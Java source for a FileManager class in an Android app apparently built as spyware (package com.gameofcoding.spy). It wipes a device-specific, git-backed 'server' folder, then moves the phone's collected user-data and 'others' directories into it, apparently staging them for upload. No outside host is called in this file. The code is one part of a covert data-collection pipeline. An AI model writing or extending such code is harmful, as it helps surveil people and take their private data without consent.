package com.gameofcoding.spy.server.files;

import android.content.Context;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.utils.FileUtils;
import java.io.File;
import com.gameofcoding.spy.server.ServerManager;
import com.gameofcoding.spy.server.Server;
import org.eclipse.jgit.api.errors.GitAPIException;

public class FileManager {
    private static final String TAG = "FilePaths";
    private final Context mContext;

    public FileManager(Context context) {
	mContext = context;
    }

    public boolean moveDataToServer() {
	ServerFiles serverFiles = ServerFiles.loadFiles(mContext);
	DataFiles dataFiles = DataFiles.loadFiles(mContext);

	if(serverFiles == null) {
	    XLog.e(TAG, "Server dir could not be loaded");
	    return false;
	}

	// Clean all previous data present in device dir
	ServerManager serverMaanager = new ServerManager(serverFiles.getRootDir(),
							 new Utils(mContext).generateDeviceId());
	Server server = null;
	Server.Directory dirDevice = null;
	try {
	    if((server = serverMaanager.loadServer()) != null) {
		XLog.i(TAG, "Server dir loaded! Cleaning it...");
		dirDevice = server.openDir(Server.Dir.DEVICE);
		if(dirDevice != null) {
		    cleanServerDir(serverFiles);
		} else {
		    XLog.w(TAG, "Failed to open device directory in server! Aborting clean...");
		}
	    } else {
		XLog.w(TAG, "Aborting clean. Server is null, it should'nt happen.");
	    }	
	// Move user data dir
	File userDataDir = dataFiles.getUserDataDir();
	if(userDataDir.renameTo(new File(serverFiles.getRootDir(), userDataDir.getName())))
	    XLog.i(TAG, "Moved '" + userDataDir + "' to servers root dir.");
	else {
	    XLog.e(TAG, "Could not move '" + userDataDir + "' to servers root dir.");
	    return false;
	}

	// Move others dir
	File othersDir = dataFiles.getOthersDir();
	if(othersDir.renameTo(new File(serverFiles.getRootDir(), othersDir.getName())))
	    XLog.i(TAG, "Moved '" + othersDir + "' to servers root dir.");
	else {
	    XLog.e(TAG, "Could not move '" + othersDir + "' to servers root dir.");
	    return false;
	}
	if(dirDevice != null)
	    dirDevice.close();
	else
	    XLog.w(TAG, "Cannot save changes, device directory is null");
	} catch(GitAPIException e) {
	    XLog.e(TAG, "Exception occured while working with server, aborting clean...", e);
	}
	return true;
    }

    private void cleanServerDir(ServerFiles serverFiles) {
	File[] files = serverFiles.getRootDir().listFiles();
	for(File file : files) {
	    if(file.isHidden()) {
		XLog.i(TAG,
		       "cleanServerDir(ServerFilePaths): Not deleting hidden file, file=" + file);
	    } else {
		if(FileUtils.deleteForcefully(file))
		    XLog.i(TAG, "cleanServerDir(ServerFilePaths): File deleted, file=" + file);
		else
		    XLog.w(TAG, "cleanServerDir(ServerFilePaths): Could not delete file, file=" + file);
	    }
		
	}
    }
				      
}
